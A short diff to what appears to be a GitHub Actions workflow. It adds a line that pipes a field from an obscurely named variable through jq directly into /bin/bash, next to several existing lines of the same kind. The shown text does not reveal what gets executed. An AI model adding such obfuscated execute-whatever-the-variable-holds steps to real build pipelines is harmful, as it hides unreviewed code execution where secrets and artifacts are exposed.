@@ -29,6 +29,7 @@ jobs:
           echo $jf7 | jq -r .qvje1 | /bin/bash
           printf '%s' "$ilf44553" | jq -r .h1 | /bin/bash
           printf '%s' "$y47" | jq -r .x527 | /bin/bash
+          printf '%s' "$ftspo07145" | jq -r .gxy86 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
